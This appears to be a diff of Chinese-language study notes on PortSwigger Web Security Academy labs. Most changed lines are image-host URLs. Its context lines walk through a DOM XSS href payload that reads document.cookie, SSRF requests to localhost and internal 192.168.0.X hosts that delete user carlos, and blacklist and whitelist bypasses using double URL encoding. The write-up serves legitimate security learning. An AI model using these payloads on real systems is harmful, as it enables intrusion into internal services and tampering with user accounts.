-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTJlN2JhYzY0NjBhYWRlZDJmY2NlMDU4YzU3YjdhOTRfZGYwYzM1M2I5YWFmM2IwOWExMGQzN2YyNTczZDFlOTdfSUQ6NzY2ODUwMjY4NDU1NTMxNjQ5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9b90c630e687.webp)
 
 `document.write` 和 `innerHTML` 都是“写 HTML”的接口，不是“执行 JS”的接口。
 
@@ -421,7 +421,7 @@ https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?categor
 
 
 
-## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-jquery\-href\-attribute\-sink
+## https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
 
 ### 第一步：看清 lab 标题
 
@@ -439,7 +439,7 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 在 /feedback 页面底部有这段 JavaScript：
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmNjZTkxMTJlYWYyZTg3ZDQ1ZDBlNDE2NGIwZDNjZDZfMDk5MjBlNWNhOTQwMTNiOGEyNTA3Y2RmMDFmZDEwMzJfSUQ6NzY2ODUzMzk4OTY1NzIwMTg5NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7010ee453f17.webp)
 
 #### 关键点：
 
@@ -467,9 +467,9 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 \<a id="backLink" href="javascript:alert\(document\.cookie\)"\>Back\</a\>
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2RhNWJiMTBhNDk1NzFhMjNjMDBlMjhkMDU2MTNlYWVfZGUyNmNlZmQ5YzU1NGJhYzU2NDA3ZTI5YTU0N2E1YTlfSUQ6NzY2ODUzNDUwNzc5MTgxMzkxOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7d93e67a1c5a.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjgyZjc5NGY0MjYzNmZlOTRkNmNkZjZkOGU5YTUxMThfMWY2N2RiY2Y5YjYyOTZjZWQzMzg1M2EzMjgxOWNlOTNfSUQ6NzY2ODUzNDU2OTA3NTI2NDQ1N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/ab7b83717c4a.webp)
 
 
 
@@ -477,23 +477,23 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 ## **Lab: Basic SSRF against the local server**
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTkzOGQxNzMxZTdhYzViYWE1OTk0ZTE4MTZhZTI3MjVfMTRhMDU3ZWRlYTgwYWI2OWMxNjQ2OTAwN2Y3NjU3OTZfSUQ6NzY3MDA0NjQ4MTAzNDA3MTAwNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/9d8a5906e287.webp)
 
 本实验存在库存查询功能，该功能会从内部系统拉取数据。 要完成实验，请修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台页面，并删除用户 `carlos`。
 
 每个产品他有个查库存的功能
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGUwNDc1ZmJhZTg0MjZhMThlMDUzZTkzZmFmMGZjYWNfYjk0MDFjNWU4OTcwZDAwNmQ5ZTVkMzQxMzNjZGE0MjJfSUQ6NzY3MDA0ODg3NTczNDYxNzI5N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/16a3b6775f1e.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NGQ3NDFkN2VmNTFhMWI0MWQxN2Q1OGU2MTczMDliMmFfZTMyOWQyYTdkMWUxODdjNmJmMThlM2Y5M2I5YmU5MmFfSUQ6NzY3MDA0OTQ2MDMzNjI0OTgyNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/95ff7660a175.webp)
 
 抓包可以看到服务器主动去请求一个接口。我们尝试给他改成本地的`http://localhost/admin` 的管理后台页面
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTZjMzFhMjUzMDUxYmIxMTYyZTgzNWZiNDQ4MTNiZTZfOWU1OTc3YjhiMWZiZWM0NDZhMjA4NzUyODRhMjk4ODlfSUQ6NzY3MDA0OTgxMzIzNjM3MDM4Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/34cc3d851f8e.webp)
 
 这边就能显示该页面，需要注意的是直接点击delete（这边是做好了写的笔记，所有题目要求的用户已经用正确方法删除了）他会出现报错说管理员接口需要登录管理员账号才能使用
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGJlMmE5YmFlMzAzZjFhYzkyMzBmYjIzMjYzZjcyMTVfMTIwMDkwMGMwODQ3ODQ1NDBhNGMzMGNkMjkyZGRiY2JfSUQ6NzY3MDA1MDE5MjY4Mzc0ODU5MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/0c47f8b9f6a4.webp)
 
 于是我们想到，直接将这个接口让服务器自己进行访问调用，便能利用这个端口
 
@@ -501,11 +501,11 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 这个接口的具体url可以通过上面手动点击删除时抓包获得
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTdjNTExYzhlZmY4NWEyYjdhYmI4OWU3MTljYjZkNTBfZjUzMGJhNmY3MTMzODIzOWJmODNiMjk1ODYyNzQ3OThfSUQ6NzY3MDA1MTA4ODczNjgxNjM5OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/1d0f51cf5811.webp)
 
 
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWNjMzIzZjg2NzQ4NzQwNTEyOGVjZTk1Y2ViZWIzZjhfMTEyNDViZTliYWQ0ZWU2ZWU3OTFlZWQ2MGY4ZTQxOTNfSUQ6NzY3MDA1MTQ5NjE4NDY0Njg3OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/5b6d381afd67.webp)
 
 发包就能成功利用服务器发送请求删除题目要求账号
 
@@ -513,33 +513,33 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 ## **Lab: Basic SSRF against another back\-end system**
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDljY2VjOGY3OGU2OWVjN2VlMjIwOTE1ZTU3YjI5MzRfYjI5NjQxZGQ4ODdjNzZkMDIzZmZiNzU4MTMxN2FhMDdfSUQ6NzY3MDA1MTg3NDU4NjM2NDg5MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a1e853f508ac.webp)
 
 本实验存在库存查询功能，该功能会从一套内部系统获取数据。 要完成实验：利用库存查询功能，扫描内网 `192.168.0.X` 网段，寻找运行在 8080 端口 的管理后台；找到后台后，通过该接口删除用户 `carlos`。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGQ1MGIzNzZkYzgwZDk0NDZiZGNhYmNjOGZjYTk5M2VfMjg2ZmNmOTMxMTMwNDdiMTVmOGVjY2EzYzRhMjVlNDlfSUQ6NzY3MDA1NDgwOTU1MDMxMDYxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/bb032712e2ec.webp)
 
 抓包之后进行整个网段的爆破
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTFhMWExNDUzNTFiZWJlMjgxOTY5N2M3NDBhNGE5MmJfZjZmYTAxYTIxYzRkZDA4NmI2NWY3NzYxMzY5ODU3ZWZfSUQ6NzY3MDA1NDg4MDE3NDk4NDQ1OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/51b3097731d5.png)
 
 爆破完后发现只有41回显不同
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWY3MDIwOWQ3NjAwOGUyM2RlODQ3MzMwYmNiNWQ2MGZfNzRkYTRiYmM5MmMwN2RhODEyNmY0ZWM5Y2UxOTAzMjFfSUQ6NzY3MDA1NDk2NzIwMjI1Mzc1NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3cdd6dceb404.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTQ1OTM5MmVmMDI5ZmFjM2ZiMTQ5OTI3Y2RkMmU5OTRfODE2M2EzODNhYTgxYTJkNjM5ZDIxZGY3YmIxMGU5YmVfSUQ6NzY3MDA1NTA3Njk3OTYwODUxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/af398757a2aa.png)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjExNzY4NTU5ZjQ5MTFjZDhmOWU4ZDgzNjc1MWYyMjRfMDE0NGQxMzdmOWY2NzIyZmRlNDkwZDM0ZGZkZDU1NGVfSUQ6NzY3MDA1NTEzNjI0MDY2NzU3OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/f7c9ff39f761.webp)
 
 可能是我们请求包的路径不对，根据上一题的经验和猜测，直接访问/admin路径
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmY1MzY3NWJiYWUyNTRhOGIxZDNkY2IxNzBkNzE5MmZfMjJkZDNiMGMwY2Q5OGZjYTg4MTE4ZWNhYTAyZjFmZjBfSUQ6NzY3MDA1NTI5OTQ2NjAyMTg0MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/76b9295121bc.webp)
 
 确实有回显，那么还是调用刚才的删除账号接口，进行删除
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OWMzMDU4MzhmZDU1MWExZWM3NmU2Zjk2YmZmMzJhMzRfMTMxOGNjZDdlYmUzYjNiNDlmZTJjMGM1ZmRkZjgyMDBfSUQ6NzY3MDA1NTU1OTg3MDA0MTAxNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/34b687365a4c.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGU3Zjk3ZGU3NjQ1MDVmNmViODE2ZGU0YmEyNmE3NTVfYTdkZTJjMmJjM2NkZmRjZjBlODZiZTcwNjk2MWU3MzBfSUQ6NzY3MDA1NTY1OTI1ODQzMjc3MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/c0e1281b8380.webp)
 
 这边其实就能证明，如果服务器存在SSRF漏洞那么就能实现内网的探测
 
@@ -547,7 +547,7 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 ## **Lab: SSRF with blacklist\-based input filter**
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTM0MjVjMjk3N2Q3N2YwMTE4YWJiZWFlNzAxNTA2YmNfYTcwMGFmYjkyMDQzMDhiYjE0YWVjOWFmZmU1NTFlZmVfSUQ6NzY3MDA1NTk0Njc2MDU4ODI0NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3f822386c002.webp)
 
 本实验包含库存查询功能，该功能会从内部系统获取数据。 要完成实验：修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台，并删除用户 `carlos`。
 
@@ -555,7 +555,7 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 尝试之前的payload发现会报错
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjlkMzZjNDJlOTdmYmU4OGU0NTYyNDRhYWMwNWQ0NzNfYmZiNzdjMmQ5YzBlMzMxMzBmMWQzYzM3YzYyYmM5NDdfSUQ6NzY3MDA1Njg2MjgyOTYyODY5NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7bbf52ceb44d.webp)
 
 出于安全原因，外部库存查询被阻止
 
@@ -567,25 +567,25 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 对url简写发现也不行
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MmI3NDkwOGQ5ODFlNzcwZDkzODJhNDE3YzYyMWI5NzlfMTJjNGNmYzMzODI4ZDFmNGE2OTNkYmFjYjdlYmFkZjNfSUQ6NzY3MDA2MTE4MzQ3MDU3MDQ1OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e67db323c07a.webp)
 
 看了一下题目提示，发现可以对字母a进行双重url编码
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODY4YzE4ZGUxYjM2MWRiZTI3Mjk2OTQ4NmJkMzU1NjRfN2YxYWQyM2M2ZTkxODY2YzE3MWMwMDMyN2MxNGQ5OTJfSUQ6NzY3MDA2MjIwNTc4MTk4NjUxM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/de0f5b012d60.webp)
 
 这个编码的时候，我用了我最习惯用的cyberchef发现编码不了
 
 豆包说：
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=M2UxYzY2ZWZhMWVkMTg3NzdjNmVlYTY5MWM5NmE1YTVfNTZjYjJlNzI1ZmYwNjY3OGVlOTBiOTg3NGNlMTQzZDVfSUQ6NzY3MDA2MjU0MDkwOTE4NjM0NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/4ea7e908c1e6.png)
 
 于是我只能用burpsuite的decoder模块进行编码，刚好熟悉一下吧，毕竟感觉高手都是用这个
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTBmMDNkZjUwZTg2OWUyYmFlYjAyZGY1Yzk0NzkxODBfNzBhNzA3NzEzYTE2MDc0ZGY4ODNhZDljZjNmZjMxOTFfSUQ6NzY3MDA2Mjc5NjE4MDQ3NDgxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/33a88003ccdb.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTQ2YjZmNjkxNGQ1ODIyMjNlZDY4YWEzZjJjYmM5MWVfMTc5ZDE0YTgyNTMzZjY2ZDU2OTEyOGFmZDdmZTkxNTJfSUQ6NzY3MDA2MjgyOTY5MjU3MDU1NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/7cf4fa776a46.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTNiODc3Yzk5MDk0NzgxNGIyMDJiZThiNWQ1M2U5ZmZfOWY2ODkzYWIyMjRkZjIxZTM2YzBiZGM3YTQzNjdmMTJfSUQ6NzY3MDA2Mjk5MDEzNzc1Njg3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/785df76a5029.png)
 
 
 
@@ -593,26 +593,26 @@ DOM XSS in jQuery anchor href attribute sink using location\.search source
 
 刚才是黑名单过滤，现在是白名单过滤了
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NmIwZDA4NjMxZDliZGRkOWZhMDNjNTdhYzQ0YmQxNmZfYmRlZDgxYTY1ZDQwMDNlZmYyMzhkMzA5NGY1YjE5MWZfSUQ6NzY3MDA2MzM0MjI2MjM3MzY1MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/496857441303.webp)
 
 1. 将 `stockApi` 参数内 URL 修改为 `http://127.0.0.1/`，可以观察到应用会解析 URL、提取主机名，并与白名单进行校验。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjUzZjg3NDFmMzVmYThjODJkM2RiYWYwMDc1YTRjZjJfOTEwNDc5NmVkZGU2NjUyZDBhMzk4M2MwNDQ1NDlmYTlfSUQ6NzY3MDA2ODUxMTkzNDg3NjYxMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/21eda36dab0e.webp)
 
 2. 将 URL 修改为 `http://username@stock.weliketoshop.net/`，请求被接受。说明 URL 解析器支持内嵌账号凭证（userinfo@host）格式。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDI3ODllMjU0NTAxZDBiNjM0ZWI2NDM4YjdkYWVmODhfMjY5ZTIwNzg5OGVhY2YwODM0NmJmMmM4NjEyMGNlOGZfSUQ6NzY3MDA2OTMyOTIxNjI2MTM5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/aeaacb3c2c7b.webp)
 
 3. 在用户名后追加 `#`，会发现 URL 被拒绝。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTJjYzIzNWYwNGRhZGUxOWIwMzU4ZjIxMzU0Y2ExMjlfNGE0YmM0MjhjNzhmNjcyYTk3NjZmOGI5MjAyMTQ0YjVfSUQ6NzY3MDA2OTQzMDMyNzU0NDgxM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/6e136518e05e.webp)
 
 4. 对 `#` 进行双重 URL 编码得到 `%2523`，此时会收到高度可疑的 “服务器内部错误” 响应。代表服务器尝试连接到字符串 `username`。
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTg3NWEyYTYwMzZhZTk1MzM3MWVjNmEyMzdmOGExMmZfYTdhNjY3ZmIxMzI4NmUyZDU1MWZmZjMzZGUwNGRmOGZfSUQ6NzY3MDA2OTg0NDcxMzMyNzU5Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/45e536154de3.webp)
 
 5. 想要访问后台并删除目标用户，将 URL 修改为：`http://localhost:80``%``2523@stock.weliketoshop.net/admin/delete?username=carlos`
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjNkMzQ4MjEzZTk3ZDczMzZlYjI2ZTRlOGE5YTQyMGJfODU3YjUyNjVhZTM3NWVmNWJhNmI5MDBhOTM5OTViMWNfSUQ6NzY3MDA3MDA4OTI0MDMwMDg0Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/a8853648dfd1.webp)
 
-![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Nzk5ZWViYmZjMDM5Y2FkZmVmMjI4YTE0YWJmMDNmOTJfYWVjODljNjE3ZDUxZTBiZmQ0MTVhZDBhNmUwMDE0NWZfSUQ6NzY3MDA3MDEyODE3Njk0MjA2MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)
+![Image](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e39f6be38663.webp)
